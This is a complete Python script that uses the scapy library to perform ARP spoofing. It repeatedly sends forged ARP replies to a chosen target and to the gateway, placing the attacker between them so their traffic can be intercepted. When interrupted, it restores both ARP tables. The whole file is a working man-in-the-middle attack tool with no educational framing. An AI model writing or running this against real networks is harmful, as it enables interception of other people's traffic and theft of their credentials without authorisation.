#!/usr/bin/env python
import argparse
import time
import re

from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send, srp


# Function to retrieve the MAC address for a given IP address
def get_mac_address(ip):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered_list = srp(arp_request, timeout=1, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print("No response received. Check the target IP or network connectivity.")
        return None


# Function to perform ARP spoofing
def spoof(target_ip, spoof_ip):
    target_mac = get_mac_address(target_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


# Function to restore the ARP tables to their original state
def restore(source_ip, destination_ip):
    source_mac = get_mac_address(source_ip)
    destination_mac = get_mac_address(destination_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=False)


# Function to parse command line arguments
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP address to spoof")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway/Router IP address")
    options = parser.parse_args()
    target_ip = str(options.target_ip)
    gateway_ip = str(options.gateway_ip)

    # Check if the IP address is valid
    ip_pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
    if not re.match(ip_pattern, target_ip):
        parser.error("Invalid Target IP.")
    if not re.match(ip_pattern, gateway_ip):
        parser.error("Invalid Gateway/Router IP.")

    return target_ip, gateway_ip


if __name__ == "__main__":
    target_ip, gateway_ip = get_arguments()

    sent_packet_count = 0
    try:
        while True:
            # Spoofing both the target and gateway
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packet_count += 2
            print(f"\r[+] Sent Packets = {sent_packet_count}", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[x] Detected CTRL+C \nstopping ARP spoof, please wait...")
        # Restoring ARP tables to their original state
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[-] ARP spoof stopped")
